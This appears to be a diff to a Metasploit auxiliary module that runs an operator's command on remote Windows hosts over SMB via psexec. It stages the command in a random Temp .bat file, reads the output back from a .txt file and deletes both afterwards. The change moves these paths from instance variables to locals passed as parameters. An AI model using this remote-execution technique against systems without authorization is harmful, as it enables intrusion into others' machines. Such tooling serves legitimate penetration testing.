@@ -46,10 +46,7 @@ class Metasploit3 < Msf::Auxiliary
 			OptString.new('RPORT', [true, 'The Target port', 445]),
 		], self.class)
 
-		deregister_options('RHOST')
-		@cmd = "C:\\WINDOWS\\SYSTEM32\\cmd.exe"
-		@text = "\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
-		@bat = "C:\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"			
+		deregister_options('RHOST')			
 	end
 	
 	
@@ -58,6 +55,10 @@ class Metasploit3 < Msf::Auxiliary
 	# This is the main controle method
 	#-----------------------------------
 	def run_host(ip)
+		cmd = "C:\\WINDOWS\\SYSTEM32\\cmd.exe"
+		text = "\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
+		bat = "C:\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
+		
 		#Try and Connect to the target
 		begin
 			connect()
@@ -75,14 +76,13 @@ class Metasploit3 < Msf::Auxiliary
 		end
 		
 		smbshare = datastore['SMBSHARE']	
-		#datastore['RHOST'] = ip
-
 		begin 
-			execute_command(smbshare, ip)
-			get_output(smbshare, ip, @text)
-			cleanup_after(smbshare, ip)
+			execute_command(smbshare, ip, cmd, text, bat)
+			get_output(smbshare, ip, text)
+			cleanup_after(smbshare, ip, cmd, text, bat)
 		rescue 
 			# Something went terribly wrong
+			return
 		end	
 	end
 	
@@ -91,10 +91,10 @@ class Metasploit3 < Msf::Auxiliary
 	#------------------------------------
 	# Executes specified Windows Command
 	#------------------------------------
-	def execute_command(smbshare, ip)
+	def execute_command(smbshare, ip, cmd, text, bat)
 		begin
 			#Try and execute the provided command
-			execute = "#{@cmd} /C echo #{datastore['COMMAND']} ^> C:#{@text} > #{@bat} & #{@cmd} /C start cmd.exe /C #{@bat}"
+			execute = "#{cmd} /C echo #{datastore['COMMAND']} ^> C:#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
 			simple.connect(smbshare)
 			print_status("Executing your command on host: #{ip}")
 			psexec(smbshare, execute)
@@ -127,10 +127,10 @@ class Metasploit3 < Msf::Auxiliary
 	#----------------------------------------------------------------------------------
 	# This is the cleanup method, removes .txt and .bat file/s created during execution-
 	#-----------------------------------------------------------------------------------
-	def cleanup_after(smbshare, ip)
+	def cleanup_after(smbshare, ip, cmd, text, bat)
 		begin
 			# Try and do cleanup command
-			cleanup = "#{@cmd} /C del C:#{@text} & del #{@bat}"
+			cleanup = "#{cmd} /C del C:#{text} & del #{bat}"
 			simple.connect(smbshare)
 			print_status("Executing cleanup on host: #{ip}")
 			psexec(smbshare, cleanup)
